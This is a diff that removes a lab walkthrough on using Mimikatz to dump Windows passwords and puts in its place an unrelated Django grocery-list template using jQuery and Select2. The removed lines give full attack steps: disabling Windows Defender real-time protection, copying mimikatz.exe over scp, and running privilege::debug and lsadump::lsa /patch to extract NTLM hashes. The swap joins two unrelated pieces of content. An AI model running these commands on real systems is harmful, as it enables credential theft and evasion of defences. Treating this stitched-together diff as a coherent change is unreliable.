@@ -1,51 +1,44 @@
-Lab 84 – How to use Mimikatz to extract all the passwords from a Windows machine
+<!-- groceries.html -->
+{% extends 'base.html' %}
 
-Objective: Learn how to use Mimikatz to get all passwords from a Windows machine.
+{% block content %}
+<h2>Groceries List</h2>
+<form method="post">
+    {% csrf_token %}
+    {% for field_name, field in form.visible_fields %}
+    <div>
+        <label for="id_{{ field_name }}">{{ field.label }}:</label>
+        {% if field.choices %}
+        <select name="{{ field_name }}" id="id_{{ field_name }}" multiple>
+            {% for value, label in field.choices %}
+                <option value="{{ value }}">{{ label }}</option>
+            {% endfor %}
+        </select>
+        {% else %}
+        {{ field }}
+        {% endif %}
+    </div>
+    {% endfor %}
+    <button type="submit">Add Items</button>
+</form>
 
-Commands:
+<h3>Available Items</h3>
+<ul>
+    {% for item in form.fields.items.choices %}
+        <li>{{ item.1 }}</li>
+    {% endfor %}
+</ul>
 
-Task 1:
-
-Open PowerShell as Administrator.
-Install SSH tools for Windows:
-arduino
-Copy code
-Add-WindowsCapability -Online -Name OpenSSH.Server~~~~0.0.1.0
-Start the SSH service and check its status:
-sql
-Copy code
-Start-Service sshd
-Get-Service sshd
-Task 2:
-Connect to the Windows machine from Kali using SSH:
-
-css
-Copy code
-ssh IEUser@192.168.56.104
-(Note: Replace IEUser@192.168.56.104 with appropriate username and IP address.)
-
-Task 3:
-
-Turn off Windows Defender’s real-time protection.
-Transfer the Mimikatz file to the Windows machine using scp:
-ruby
-Copy code
-scp /usr/share/windows-resources/mimikatz/x64/mimikatz.exe \ IEUser@192.168.56.104:/Users/IEUser/
-(Note: Ensure correct paths and user details.)
-
-Task 4:
-
-Execute Mimikatz:
-Copy code
-mimikatz.exe
-Check if Mimikatz is running as Administrator:
-arduino
-Copy code
-privilege::debug
-Task 5:
-Dump NTLM hashes from the system using Mimikatz:
-
-arduino
-Copy code
-lsadump::lsa /patch
-The provided commands allow users to set up SSH on a Windows machine, connect to it from a Kali machine, transfer Mimikatz, and then extract password hashes using Mimikatz. Always ensure you have permission and are authorized to perform such activities on the target system.
+<script src="https://code.jquery.com/jquery-3.6.0.min.js"></script>
+<link href="https://cdnjs.cloudflare.com/ajax/libs/select2/4.0.13/css/select2.min.css" rel="stylesheet" />
+<script src="https://cdnjs.cloudflare.com/ajax/libs/select2/4.0.13/js/select2.min.js"></script>
+<script>
+    $(document).ready(function() {
+        {% for field_name, field in form.visible_fields %}
+        {% if field.choices %}
+        $('#id_{{ field_name }}').select2();
+        {% endif %}
+        {% endfor %}
+    });
+</script>
+{% endblock %}
